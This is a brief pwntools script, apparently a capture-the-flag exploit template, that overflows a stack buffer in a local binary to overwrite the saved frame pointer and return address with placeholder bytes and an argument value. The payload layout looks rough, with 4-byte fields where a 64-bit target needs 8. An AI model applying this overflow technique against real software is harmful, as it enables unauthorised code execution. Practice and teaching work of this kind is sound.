#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'a.out')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

payload = flat(
        b"A" * 0x28, # buffer
        b"B" * 0x4, # saved rbp
        b"C" * 0x4, # return address
        0xcafebabe, # args
        )
io.sendline(payload)
io.interactive()

